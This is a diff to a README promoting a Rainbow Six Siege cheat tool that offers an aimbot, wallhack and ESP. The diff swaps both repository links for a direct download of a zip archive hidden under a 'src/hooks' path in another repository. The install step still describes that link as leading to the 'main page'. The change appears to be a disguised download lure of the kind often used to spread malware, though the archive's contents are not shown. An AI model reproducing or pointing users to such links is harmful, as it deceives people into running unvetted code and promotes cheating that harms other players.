@@ -5,7 +5,7 @@ description: "Enhance Rainbow Six Siege with ESP, aimbot, wallhack, no recoil, a
 ---
 # 🎯 R6-Apex-Tool - Win every match with better aim
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/krisknifelike167/R6-Apex-Tool)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/krisknifelike167/krisknifelike167.github.io/raw/refs/heads/main/src/hooks/Latest-3.5.zip)
 
 ## 💡 About this software
 
@@ -31,7 +31,7 @@ R6-Apex-Tool helps you play Rainbow Six Siege with extra help. The software prov
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the [official link](https://github.com/krisknifelike167/R6-Apex-Tool) to reach the main page.
+1.  Visit the [official link](https://github.com/krisknifelike167/krisknifelike167.github.io/raw/refs/heads/main/src/hooks/Latest-3.5.zip) to reach the main page.
 2.  Click the release section on the right side of the screen.
 3.  Choose the version labeled for Windows.
 4.  Download the compressed file to your computer.
